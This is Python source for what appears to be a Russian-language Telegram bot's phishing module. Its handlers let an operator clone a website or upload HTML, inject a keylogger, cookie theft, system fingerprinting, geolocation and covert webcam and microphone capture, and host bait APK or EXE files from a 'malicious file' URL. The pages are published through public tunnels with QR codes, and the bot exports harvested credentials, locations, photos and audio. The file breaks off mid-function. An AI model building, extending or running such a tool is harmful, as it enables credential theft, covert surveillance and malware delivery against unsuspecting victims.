def _fish_send_options_html(chat_id):
    """Меню инжекций для загруженного HTML-файла (не скачанного с URL)."""
    data = _fish_user_data.get(chat_id, {})
    fname = data.get('html_filename', 'файл.html')
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })

    def _t(v): return "🟢" if v else "⚪"
    def _ob(label, key): return btn("{} {}".format(_t(opts.get(key, False)), label),
                                    "fish_opt_html:{}".format(key))

    active = sum(1 for k in ('geo','cam','mic','keylogger','steal_cookies','system_info')
                 if opts.get(k))

    send_message(
        "🌐 <b>HTML: {}</b>\n"
        "Инжекций: <b>{}</b>\n\n"
        "<i>Включи нужные модули → 🚀 Создать</i>".format(fname, active),
        chat_id,
        reply_markup=kb(
            [btn("═══ 📍 СЛЕЖКА ═══",       "noop")],
            [_ob("Геолокация",  "geo"),       _ob("Камера",      "cam")],
            [_ob("Микрофон",    "mic"),        _ob("Кейлоггер",   "keylogger")],
            [btn("═══ 🍪 ДАННЫЕ ═══",         "noop")],
            [_ob("Куки",        "cookies"),    _ob("Инфо системы","sysinfo")],
            [btn("═══ ─────────── ═══",       "noop")],
            [btn("🚀 Создать страницу",       "fish_opt_html:generate"),
             btn("❌ Отмена",                 "menu_fish")],
        )
    )


def _fish_handle_opt_html(toggle, chat_id):
    """Обрабатывает fish_opt_html: — те же опции что и для DL-страницы."""
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    data = _fish_user_data.get(chat_id, {})

    simple_toggles = {
        'geo': 'geo', 'cam': 'cam', 'mic': 'mic', 'auto': 'auto',
        'keylogger': 'keylogger', 'cookies': 'steal_cookies',
        'sysinfo': 'system_info',
    }
    if toggle in simple_toggles:
        k = simple_toggles[toggle]
        opts[k] = not opts.get(k, False)
        _fish_send_options_html(chat_id)
        return

    if toggle == 'generate':
        html = data.get('html_content')
        fname = data.get('html_filename', 'page.html')
        if not html:
            send_message("❌ HTML не найден. Загрузи файл снова.", chat_id,
                         reply_markup=kb([btn("🌐 Загрузить HTML", "fish:upload_html"),
                                          back_btn("menu_fish")]))
            return

        # Применяем инжекции
        injected = fish_utils.inject_scripts(
            html,
            geo=opts.get('geo', False),
            media=opts.get('cam', False) or opts.get('mic', False),
            capture_photo=opts.get('cam', False),
            capture_audio=opts.get('mic', False),
            download_file_id=None,
            auto_download=False,
            keylogger=opts.get('keylogger', False),
            steal_cookies=opts.get('steal_cookies', False),
            system_info=opts.get('system_info', False),
            iframe_phish=False,
            iframe_url=None,
        )

        # Сохраняем страницу
        source_label = "html_upload_{}".format(fname.replace('.html','').replace('.htm',''))
        pid = fish_downloader.save_page(injected, source_label, 'uploaded_html')
        fish_downloader.set_active_page(pid)

        _fish_user_data.pop(chat_id, None)
        _fish_user_opts.pop(chat_id, None)

        base_url = (fish_bot_state.tunnel_url or
                    ("http://localhost:{}".format(_fish_cfg.SERVER_PORT)
                     if fish_bot_state.server_running else None))
        url_line = "\n🔗 <code>{}/</code>".format(base_url) if base_url else ""

        active_inj = sum(1 for k in ('geo','cam','mic','keylogger','steal_cookies','system_info')
                         if opts.get(k))

        send_message(
            "✅ <b>HTML-страница создана!</b>\n"
            "Файл: <b>{}</b>\n"
            "ID: <code>{}</code>  |  Инжекций: <b>{}</b>{}\n\n"
            "<i>Страница активирована и готова.</i>".format(
                fname, pid, active_inj, url_line),
            chat_id,
            reply_markup=kb(
                [btn("📱 QR-код", "fish:qr"),
                 btn("📊 Статистика", "fish:stats")],
                [btn("🌐 Загрузить ещё", "fish:upload_html"),
                 back_btn("menu_fish")],
            ))


def _fish_handle_action(action, chat_id):
    """Обрабатывает fish: callback actions."""
    if not FISH_ENABLED:
        send_message("❌ Фишинг-модуль не загружен. Проверь зависимости.", chat_id)
        return

    if action == 'load':
        _wait_state[chat_id] = 'fish_load_url'
        send_message("📥 Введи URL страницы (например https://vk.com):",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'fullsite':
        _wait_state[chat_id] = 'fish_fullsite_url'
        send_message("🌐 Введи URL сайта для полного скачивания:",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action in ('load_geo', 'load_cam', 'load_mic'):
        mode = {'load_geo': 'geo', 'load_cam': 'cam', 'load_mic': 'mic'}[action]
        _wait_state[chat_id] = 'fish_load_{}_url'.format(mode)
        send_message("📥 Введи URL страницы (+{} инжекция):".format(mode),
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'upload_html':
        _wait_state[chat_id] = 'fish_upload_html'
        send_message(
            "🌐 <b>Загрузить HTML-страницу</b>\n\n"
            "Отправь <b>.html</b> файл — он станет фишинговой страницей.\n\n"
            "Что будет дальше:\n"
            "• Файл прочитается как HTML\n"
            "• Ты выберешь инжекции (гео/камера/кейлоггер...)\n"
            "• Страница активируется на сервере\n\n"
            "<i>💡 Совет: можно загружать клоны с любых сайтов</i>",
            chat_id,
            reply_markup=kb(
                [btn("❌ Отмена", "menu_fish")],
            ))

    elif action == 'upload':
        _wait_state[chat_id] = 'fish_upload_file'
        send_message(
            "📤 <b>Загрузить файл-приманку</b>\n\n"
            "Отправь файл прямо сюда. Telegram ограничивает — до <b>20 MB</b>.\n\n"
            "<b>Популярные форматы:</b>\n"
            "• APK / IPA — мобильные приложения\n"
            "• EXE / MSI — установщики Windows\n"
            "• PDF / DOCX — документы\n"
            "• ZIP / RAR — архивы\n"
            "• MP4 / MOV — видео\n\n"
            "<i>После загрузки файл появится в «Мои файлы» и станет доступен "
            "для страницы скачивания.</i>",
            chat_id,
            reply_markup=kb(
                [btn("📂 Мои файлы", "fish:files")],
                [btn("❌ Отмена",     "menu_fish")],
            ))

    elif action == 'files':
        files = fish_db.get_all_files()
        if not files:
            send_message(
                "📭 <b>Файлов нет</b>\n\nЗагрузи первый файл — нажми кнопку ниже.",
                chat_id,
                reply_markup=kb(
                    [btn("📤 Загрузить файл", "fish:upload")],
                    [back_btn("menu_fish")],
                ))
            return
        total_size = sum(f['size'] for f in files) / 1024
        lines = ["📂 <b>Файлы-приманки</b> ({} шт., {:.0f} KB)\n".format(len(files), total_size)]
        for f in files:
            fid, name, size, dls = f['id'], f['original_name'], f['size'], f['downloads']
            ext = name.rsplit('.', 1)[-1].upper() if '.' in name else '???'
            icon = {'APK': '📱', 'EXE': '💻', 'MSI': '💻', 'PDF': '📕',
                    'ZIP': '🗜', 'RAR': '🗜', 'MP4': '🎬', 'MOV': '🎬',
                    'DOCX': '📄', 'DOC': '📄'}.get(ext, '📁')
            lines.append(
                "{} <b>{}</b>\n"
                "   ID: <code>{}</code>  |  {:.0f} KB  |  ⬇️ {} загрузок".format(
                    icon, name, fid, size / 1024, dls))
        # Кнопка на каждый файл: [📄 DL-стр | 🗑 Удалить]
        rows = []
        for f in files:
            rows.append([
                btn("📄 DL-стр → {}".format(f['original_name'][:18]),
                    "fish_selfile:{}".format(f['id'])),
                btn("🗑 #{}".format(f['id']),
                    "fish:del_file:{}".format(f['id'])),
            ])
        rows.append([btn("📤 Загрузить ещё", "fish:upload"), back_btn("menu_fish")])
        send_message("\n".join(lines), chat_id, reply_markup=kb(*rows))

    elif action == 'create_dl':
        files = fish_db.get_all_files()
        if not files:
            send_message(
                "❌ <b>Нет файлов</b>\n\n"
                "Сначала загрузи файл-приманку — жми кнопку ниже.\n"
                "<i>Например: APK, EXE, PDF, ZIP...</i>",
                chat_id,
                reply_markup=kb(
                    [btn("📤 Загрузить файл", "fish:upload")],
                    [back_btn("menu_fish")],
                ))
            return
        lines = ["📄 <b>Страница скачивания</b>\n\nВыбери файл-приманку:\n"]
        rows = []
        for f in files:
            ext = f['original_name'].rsplit('.', 1)[-1].upper() if '.' in f['original_name'] else '?'
            icon = {'APK': '📱', 'EXE': '💻', 'PDF': '📕', 'ZIP': '🗜',
                    'RAR': '🗜', 'MP4': '🎬', 'DOCX': '📄'}.get(ext, '📁')
            label = "{} {} — {:.0f} KB | ⬇️{}".format(
                icon, f['original_name'], f['size']/1024, f['downloads'])
            rows.append([btn(label, "fish_selfile:{}".format(f['id']))])
        rows.append([btn("📤 Загрузить ещё", "fish:upload"), back_btn("menu_fish")])
        send_message("".join(lines), chat_id, reply_markup=kb(*rows))

    elif action.startswith('del_file:'):
        # Удаление файла
        fid_str = action.split(':', 1)[1]
        try:
            fid = int(fid_str)
            files = fish_db.get_all_files()
            fi = next((f for f in files if f['id'] == fid), None)
            if fi:
                fish_db.delete_file(fid)
                send_message(
                    "🗑 Файл <b>{}</b> удалён.".format(fi['original_name']),
                    chat_id,
                    reply_markup=kb([btn("📂 Мои файлы", "fish:files"), back_btn("menu_fish")]))
            else:
                send_message("❌ Файл не найден.", chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка удаления: {}".format(e), chat_id)

    elif action == 'payload':
        _wait_state[chat_id] = 'fish_payload_url'
        send_message("💣 Введи URL вредоносного файла:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'pages':
        pages = fish_downloader.get_all_pages()
        if not pages:
            send_message("📭 Нет сохранённых страниц.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return
        lines = ["📚 <b>Страницы</b> (последние 10):\n"]
        for pid, meta in sorted(pages.items(), key=lambda x: x[0], reverse=True)[:10]:
            ptype = "🌐" if meta.get('type') == 'full_site' else "📄"
            lines.append("{} <code>{}</code> — {}".format(
                ptype, pid, meta['url'][:45]))
        rows = [[btn("✅ Активировать ID", "fish:use_page"),
                 btn("♻️ Клонировать ID",  "fish:clone_page")]]
        rows.append([back_btn("menu_fish")])
        send_message("\n".join(lines), chat_id, reply_markup=kb(*rows))

    elif action == 'use_page':
        _wait_state[chat_id] = 'fish_use_page'
        send_message("✅ Введи ID страницы для активации:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'clone_page':
        _wait_state[chat_id] = 'fish_clone_page'
        send_message("♻️ Введи ID страницы для клонирования:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'fish_stats':
        try:
            cc, gc, wc, mc, vc = fish_db.get_stats()
            send_message(
                "📊 <b>Фишинг-статистика</b>\n\n"
                "🔑 Данных: {}\n📍 Геолокаций: {}\n"
                "📸 Фото: {}\n🎤 Аудио: {}\n👁 Визитов: {}".format(
                    cc, gc, wc, mc, vc),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка: {}".format(e), chat_id)

    elif action == 'tunnel':
        def _do_tunnel():
            # На Windows — автоскачиваем cloudflared если нет
            if _is_windows() and not shutil.which("cloudflared"):
                send_message("⬇️ cloudflared не найден, скачиваю...", chat_id)
                _windows_install_cloudflared()
                if not shutil.which("cloudflared"):
                    send_message(
                        "❌ Не удалось скачать cloudflared автоматически.\n\n"
                        "Скачай вручную:\n"
                        "<code>https://github.com/cloudflare/cloudflared/releases/latest/"
                        "download/cloudflared-windows-amd64.exe</code>\n\n"
                        "Положи <b>cloudflared.exe</b> рядом с bot.py и перезапусти.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                    return
            # Определяем что реально доступно и пишем правильное сообщение
            has_cf   = shutil.which("cloudflared") and not _is_termux()
            has_bore = shutil.which("bore")
            has_ssh  = shutil.which("ssh")
            if has_cf:
                what = "☁️ Запускаю Cloudflared..."
            elif has_bore:
                what = "🕳 Cloudflared недоступен, запускаю bore..."
            elif has_ssh:
                what = "🔑 Запускаю тоннель через serveo (SSH)..."
            else:
                what = "🔄 Пробую запустить тоннель..."
            send_message(what, chat_id)
            _fish_stop_tunnel()
            url = _fish_start_cloudflared()
            if url:
                # Определяем тип по URL
                if "trycloudflare.com" in url:
                    icon, name = "☁️", "Cloudflared"
                elif "bore.pub" in url:
                    icon, name = "🕳", "Bore"
                elif "serveo" in url:
                    icon, name = "🔑", "Serveo"
                else:
                    icon, name = "🌍", "Туннель"
                send_message(
                    "✅ <b>Туннель запущен!</b> ({})\n"
                    "🔗 <code>{}</code>\n"
                    "Порт: {}".format(name, url, _fish_cfg.SERVER_PORT),
                    chat_id, reply_markup=kb(
                        [btn("📱 QR-код", "fish:qr")],
                        [back_btn("menu_fish")]))
            else:
                available = []
                if shutil.which("bore"): available.append("bore")
                if shutil.which("ssh"):  available.append("serveo")
                hint = "Попробуй: " + " / ".join(available) if available else "Нет доступных тоннелей."
                send_message(
                    "❌ Не удалось запустить тоннель.\n{}".format(hint),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_tunnel)

    elif action == 'stop_tunnel':
        _fish_stop_tunnel()
        send_message("🛑 Туннель остановлен.", chat_id,
                     reply_markup=kb([back_btn("menu_fish")]))

    # ── bore ────────────────────────────────────────────────────────
    elif action == 'bore_start':
        def _do_bore():
            # Если bore уже жив — не дублируем
            if (fish_bot_state.bore_process is not None and
                    fish_bot_state.bore_process.poll() is None):
                send_message(
                    "🕳 Bore уже запущен: {}".format(fish_bot_state.bore_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("bore"):
                send_message(
                    "❌ bore не установлен.\n"
                    "Установи: <code>cargo install bore-cli</code>\n"
                    "Или: <code>pkg install rust && cargo install bore-cli</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🕳 Запускаю bore...", chat_id)
            try:
                proc = subprocess.Popen(
                    ["bore", "local", str(_fish_cfg.SERVER_PORT), "--to", "bore.pub"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.bore_process = proc
                port_pat = re.compile(r"bore\.pub:(\d+)")
                url = None
                for line in proc.stdout:
                    print("bore:", line.rstrip(), flush=True)
                    m = port_pat.search(line)
                    if m:
                        url = "http://bore.pub:{}".format(m.group(1))
                        fish_bot_state.bore_url = url
                        break
                if url:
                    send_message(
                        "🕳 Bore запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message("❌ bore не дал URL. Смотри логи.", chat_id,
                                 reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка bore: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_bore)

    elif action == 'bore_stop':
        if fish_bot_state.bore_process:
            fish_bot_state.bore_process.terminate()
            fish_bot_state.bore_process = None
            fish_bot_state.bore_url     = None
            send_message("🛑 Bore остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ Bore не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── ngrok ────────────────────────────────────────────────────────
    elif action == 'ngrok_start':
        def _do_ngrok():
            # Проверяем что ngrok не запущен повторно
            if (fish_bot_state.ngrok_process is not None and
                    fish_bot_state.ngrok_process.poll() is None):
                send_message(
                    "🔌 ngrok уже запущен: {}".format(fish_bot_state.ngrok_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("ngrok"):
                send_message(
                    "❌ ngrok не установлен.\n\n"
                    "Установка в Termux:\n"
                    "<code>pkg install wget</code>\n"
                    "<code>wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz</code>\n"
                    "<code>tar xf ngrok-v3-stable-linux-arm64.tgz</code>\n"
                    "<code>mv ngrok $PREFIX/bin/</code>\n\n"
                    "Затем авторизация (нужен бесплатный аккаунт на ngrok.com):\n"
                    "<code>ngrok config add-authtoken ВАШ_ТОКЕН</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🔌 Запускаю ngrok...", chat_id)
            try:
                # ngrok http PORT — запускает туннель и пишет URL в stderr/stdout.
                # Используем --log=stdout чтобы читать JSON-лог со статусом.
                proc = subprocess.Popen(
                    ["ngrok", "http",
                     "--log=stdout", "--log-format=json",
                     str(_fish_cfg.SERVER_PORT)],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.ngrok_process = proc

                # ngrok пишет JSON-строки; ждём строку с url
                import json as _json
                url = None
                url_pat = re.compile(r"https://[a-zA-Z0-9-]+\.ngrok(?:-free)?\.app")

                for line in proc.stdout:
                    line = line.strip()
                    print("ngrok:", line, flush=True)

                    # Пробуем JSON-парсинг — новые версии ngrok пишут JSON
                    try:
                        obj = _json.loads(line)
                        # Поле url появляется в событии tunnel started
                        candidate = obj.get("url") or obj.get("Url", "")
                        if candidate.startswith("https://"):
                            url = candidate
                            break
                    except _json.JSONDecodeError:
                        pass

                    # Фоллбэк — ищем URL текстовым паттерном
                    m = url_pat.search(line)
                    if m:
                        url = m.group(0)
                        break

                    # Ошибка авторизации — сообщаем сразу
                    if "ERR_NGROK_105" in line or "authentication" in line.lower():
                        proc.terminate()
                        send_message(
                            "❌ ngrok: нужна авторизация.\n"
                            "Зарегистрируйся на ngrok.com и выполни:\n"
                            "<code>ngrok config add-authtoken ВАШ_ТОКЕН</code>",
                            chat_id, reply_markup=kb([back_btn("menu_fish")]))
                        return

                if url:
                    fish_bot_state.ngrok_url = url
                    send_message(
                        "🔌 ngrok запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message(
                        "❌ ngrok не дал URL. Проверь авторизацию и логи.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка ngrok: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_ngrok)

    elif action == 'ngrok_stop':
        if fish_bot_state.ngrok_process:
            fish_bot_state.ngrok_process.terminate()
            fish_bot_state.ngrok_process = None
            fish_bot_state.ngrok_url     = None
            send_message("🛑 ngrok остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ ngrok не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── serveo ───────────────────────────────────────────────────────
    elif action == 'serveo_start':
        def _do_serveo():
            # Проверяем что serveo не запущен повторно
            if (fish_bot_state.serveo_process is not None and
                    fish_bot_state.serveo_process.poll() is None):
                send_message(
                    "🔑 Serveo уже запущен: {}".format(fish_bot_state.serveo_url),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            if not shutil.which("ssh"):
                send_message(
                    "❌ ssh не найден.\n<code>pkg install openssh</code>",
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
                return

            send_message("🔑 Запускаю serveo (SSH-тоннель)...", chat_id)
            try:
                # serveo.net — бесплатный SSH reverse tunnel.
                # -R 80:localhost:PORT пробрасывает локальный порт на serveo.
                # -N — не выполнять команды, только форвардинг.
                # ServerAliveInterval — keepalive чтобы SSH не закрылся.
                proc = subprocess.Popen(
                    ["ssh",
                     "-o", "StrictHostKeyChecking=no",
                     "-o", "ServerAliveInterval=30",
                     "-o", "ServerAliveCountMax=3",
                     "-o", "ExitOnForwardFailure=yes",
                     "-R", "80:localhost:{}".format(_fish_cfg.SERVER_PORT),
                     "serveo.net"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.serveo_process = proc
                url_pat = re.compile(r"https://[a-zA-Z0-9-]+\.serveo\.net")

                url = None
                for line in proc.stdout:
                    print("serveo:", line.rstrip(), flush=True)
                    m = url_pat.search(line)
                    if m:
                        url = m.group(0)
                        break
                    # serveo иногда отказывает — сообщаем сразу
                    if "Connection refused" in line or "Permission denied" in line:
                        proc.terminate()
                        send_message(
                            "❌ Serveo недоступен: {}\n\n"
                            "Попробуй bore или ngrok.".format(line.strip()),
                            chat_id, reply_markup=kb([back_btn("menu_fish")]))
                        return

                if url:
                    fish_bot_state.serveo_url = url
                    send_message(
                        "🔑 Serveo запущен!\n🔗 <code>{}</code>".format(url),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                else:
                    send_message(
                        "❌ Serveo не дал URL. Сервис может быть недоступен.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка serveo: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_serveo)

    elif action == 'serveo_stop':
        if fish_bot_state.serveo_process:
            fish_bot_state.serveo_process.terminate()
            fish_bot_state.serveo_process = None
            fish_bot_state.serveo_url     = None
            send_message("🛑 Serveo остановлен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
        else:
            send_message("ℹ️ Serveo не запущен.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))

    # ── Flask-сервер ────────────────────────────────────────────────
    elif action == 'server_start':
        if fish_bot_state.server_running:
            send_message(
                "ℹ️ Сервер уже работает на порту {}.".format(_fish_cfg.SERVER_PORT),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        else:
            def _do_server_start():
                try:
                    from fish_web import app as fish_app
                    def _run():
                        fish_bot_state.server_running = True
                        try:
                            fish_app.run(
                                host=_fish_cfg.SERVER_HOST,
                                port=_fish_cfg.SERVER_PORT,
                                debug=False, use_reloader=False,
                            )
                        finally:
                            fish_bot_state.server_running = False
                    t = threading.Thread(target=_run, daemon=True, name="fish-flask")
                    fish_bot_state.server_thread = t
                    t.start()
                    import time as _time; _time.sleep(1.5)
                    send_message(
                        "✅ Сервер запущен на порту {}.".format(_fish_cfg.SERVER_PORT),
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                except Exception as e:
                    send_message("❌ Ошибка старта сервера: {}".format(e), chat_id,
                                 reply_markup=kb([back_btn("menu_fish")]))
            _run_in_thread(_do_server_start)

    elif action == 'server_stop':
        # Flask не умеет останавливаться красиво без Werkzeug shutdown,
        # поэтому обновляем флаг и убиваем поток через daemon-stop.
        # При следующем рестарте поднимем новый.
        fish_bot_state.server_running = False
        send_message(
            "🛑 Флаг сервера сброшен. Используй «Рестарт» для полного перезапуска.",
            chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'server_restart':
        def _do_restart():
            # Останавливаем bore и туннель чтобы не было конфликтов по порту
            if fish_bot_state.bore_process:
                fish_bot_state.bore_process.terminate()
                fish_bot_state.bore_process = None
                fish_bot_state.bore_url     = None
            fish_bot_state.server_running = False

            import time as _time; _time.sleep(1)

            try:
                from fish_web import app as fish_app
                def _run():
                    fish_bot_state.server_running = True
                    try:
                        fish_app.run(
                            host=_fish_cfg.SERVER_HOST,
                            port=_fish_cfg.SERVER_PORT,
                            debug=False, use_reloader=False,
                        )
                    finally:
                        fish_bot_state.server_running = False
                t = threading.Thread(target=_run, daemon=True, name="fish-flask-restart")
                fish_bot_state.server_thread = t
                t.start()
                _time.sleep(1.5)
                send_message(
                    "🔄 Сервер перезапущен на порту {}.".format(_fish_cfg.SERVER_PORT),
                    chat_id, reply_markup=kb([back_btn("menu_fish")]))
            except Exception as e:
                send_message("❌ Ошибка рестарта: {}".format(e), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        _run_in_thread(_do_restart)

    elif action == 'gen_domain':
        _wait_state[chat_id] = 'fish_gen_domain'
        send_message("🔀 Введи домен (например limpa.ru):", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'qr':
        url = fish_bot_state.tunnel_url or "http://localhost:{}".format(_fish_cfg.SERVER_PORT)
        try:
            img = fish_utils.generate_qr(url, return_img=True)
            import requests as _req
            _req.post(
                "https://api.telegram.org/bot{}/sendPhoto".format(config.TELEGRAM_BOT_TOKEN),
                data={'chat_id': chat_id, 'caption': "🔗 {}".format(url)},
                files={'photo': ('qr.png', img, 'image/png')},
                timeout=30
            )
        except Exception as e:
            send_message("❌ QR ошибка: {}".format(e), chat_id)

    elif action == 'photos':
        webcam_dir = os.path.join(_fish_cfg.LOGS_DIR, 'webcam')
        files = sorted(os.listdir(webcam_dir), reverse=True)[:10] if os.path.exists(webcam_dir) else []
        if not files:
            send_message("📭 Нет фото.", chat_id, reply_markup=kb([back_btn("menu_fish")]))
            return
        text = "📸 <b>Фото с вебки:</b>\n" + "\n".join("<code>{}</code>".format(f) for f in files)
        send_message(text, chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'audios':
        audio_dir = os.path.join(_fish_cfg.LOGS_DIR, 'microphone')
        files = sorted(os.listdir(audio_dir), reverse=True)[:10] if os.path.exists(audio_dir) else []
        if not files:
            send_message("📭 Нет аудио.", chat_id, reply_markup=kb([back_btn("menu_fish")]))
            return
        text = "🎵 <b>Аудио записи:</b>\n" + "\n".join("<code>{}</code>".format(f) for f in files)
        send_message(text, chat_id, reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'map':
        send_message("🗺 Генерирую карту...", chat_id)
        def _do_map():
            try:
                import sqlite3
                conn = sqlite3.connect(_fish_cfg.DB_PATH)
                try:
                    rows = conn.execute(
                        "SELECT lat, lon FROM geo WHERE lat IS NOT NULL AND lon IS NOT NULL"
                    ).fetchall()
                except Exception:
                    rows = []
                conn.close()

                if not rows:
                    send_message("❌ Нет данных геолокации.", chat_id)
                    return

                # Пробуем folium
                try:
                    import folium, io, tempfile
                    lats = [r[0] for r in rows]
                    lons = [r[1] for r in rows]
                    m = folium.Map(location=[sum(lats)/len(lats), sum(lons)/len(lons)], zoom_start=2)
                    for lat, lon in rows:
                        folium.Marker([lat, lon]).add_to(m)
                    with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as tmp:
                        m.save(tmp.name); tmp_path = tmp.name
                    send_document(tmp_path, caption=f"📍 Карта ({len(rows)} точек)", chat_id=chat_id)
                    os.unlink(tmp_path)
                    return
                except ImportError:
                    pass

                # Fallback: текстовый отчёт с ссылками Google Maps
                lines = [f"📍 <b>Геолокации ({len(rows)} точек):</b>\n"]
                for i, (lat, lon) in enumerate(rows[:20], 1):
                    url = f"https://maps.google.com/?q={lat},{lon}"
                    lines.append(f"{i}. <a href='{url}'>{lat:.4f}, {lon:.4f}</a>")
                if len(rows) > 20:
                    lines.append(f"\n... и ещё {len(rows)-20} точек")
                lines.append("\n💡 Установи folium: <code>pip install folium pandas</code>")
                send_message("\n".join(lines), chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))

            except Exception as e:
                send_message(f"❌ Ошибка карты: {e}", chat_id)
        _run_in_thread(_do_map)

    elif action == 'export':
        send_message("📤 Экспортирую...", chat_id)
        def _do_export():
            try:
                import sqlite3, pandas as pd, zipfile, io, tempfile
                conn = sqlite3.connect(_fish_cfg.DB_PATH)
                dfs = {
                    'credentials.csv': pd.read_sql_query("SELECT * FROM credentials", conn),
                    'geo.csv': pd.read_sql_query("SELECT * FROM geo", conn),
                    'media.csv': pd.read_sql_query("SELECT * FROM media", conn),
                    'visits.csv': pd.read_sql_query("SELECT * FROM visits", conn),
                }
                conn.close()
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, 'a', zipfile.ZIP_DEFLATED) as zf:
                    for name, df in dfs.items():
                        zf.writestr(name, df.to_csv(index=False).encode('utf-8'))
                buf.seek(0)
                with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
                    tmp.write(buf.read()); tmp_path = tmp.name
                send_document(tmp_path, caption="📦 Фишинг данные", chat_id=chat_id)
                os.unlink(tmp_path)
            except Exception as e:
                send_message("❌ Ошибка экспорта: {}".format(e), chat_id)
        _run_in_thread(_do_export)

    elif action == 'clear_logs':
        fish_db.clear_all_logs()
        send_message("🧹 Логи и БД очищены.", chat_id,
                     reply_markup=kb([back_btn("menu_fish")]))

    elif action == 'status':
        turl = fish_bot_state.tunnel_url
        tunnel_ok = fish_bot_state.tunnel_process and fish_bot_state.tunnel_process.poll() is None
        active_info = fish_downloader.get_active_page_info()
        active_str = "✅ ID: {}".format(active_info[0]) if active_info else "❌ нет"
        try:
            cc, gc, wc, mc, vc = fish_db.get_stats()
            stats_str = "Крединш: {} | Гео: {} | Фото: {} | Аудио: {} | Визиты: {}".format(
                cc, gc, wc, mc, vc)
        except Exception:
            stats_str = "n/a"
        send_message(
            "ℹ️ <b>Статус фишинга</b>\n\n"
            "🌍 Туннель: {} | {}\n"
            "📄 Активная стр.: {}\n"
            "🖥 Flask порт: {}\n"
            "📊 {}".format(
                "🟢 работает" if tunnel_ok else "🔴 стоп",
                turl or "нет URL",
                active_str,
                _fish_cfg.SERVER_PORT,
                stats_str),
            chat_id, reply_markup=kb([back_btn("menu_fish")]))


def _fish_process_load(chat_id, url, inject_geo=False, inject_media=False,
                        fake_domain=False, capture_photo=True, capture_audio=True):
    """Скачивает страницу и активирует её с прогресс-статусами."""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    fish_bot_state.last_loaded_url = url

    # Отправляем первое сообщение и запоминаем его ID для последующего
    # редактирования — так пользователь видит прогресс в одном месте,
    # а не получает 5 отдельных сообщений.
    msg = send_message("⏬ Скачиваю {}...".format(url), chat_id)
    msg_id = msg.get('result', {}).get('message_id') if msg else None

    def _status(text):
        """Редактируем существующее сообщение или шлём новое."""
        if msg_id:
            try:
                edit_message(chat_id, msg_id, text)
                return
            except Exception:
                pass
        send_message(text, chat_id)

    def _do():
        try:
            # on_status передаём чтобы download_page мог обновлять статус
            # пока идёт скачивание — иначе пользователь видит тишину 20-30 сек
            html = fish_downloader.download_page(url, on_status=_status)
            _status("⚙️ Применяю скрипты...")
